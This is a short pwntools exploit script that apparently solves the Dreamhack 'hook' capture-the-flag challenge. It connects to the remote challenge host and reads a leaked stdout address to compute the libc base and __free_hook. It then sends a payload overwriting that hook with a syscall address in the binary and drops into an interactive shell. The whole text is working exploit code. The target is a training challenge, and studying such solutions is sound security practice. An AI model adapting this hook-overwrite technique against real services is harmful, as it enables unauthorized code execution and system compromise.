from pwn import *
context.update(arch='amd64', os='linux')
p = remote("host3.dreamhack.games", 16895)
#c = process("./hook", env={'LD_PRELOAD':'./libc.so.6'})
#c = process("./hook")
libc=ELF('./libc-2.23.so')

print(p.recvuntil(b"stdout: "))
stdout = int(p.recv(14), 16)
main_syscall = 0x400a11

print("stdout : "+hex(stdout))

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

payload = p64(free_hook)+p64(main_syscall)

p.sendlineafter(b"Size: ", b"400")
p.sendlineafter(b"Data: ", payload)

p.interactive()
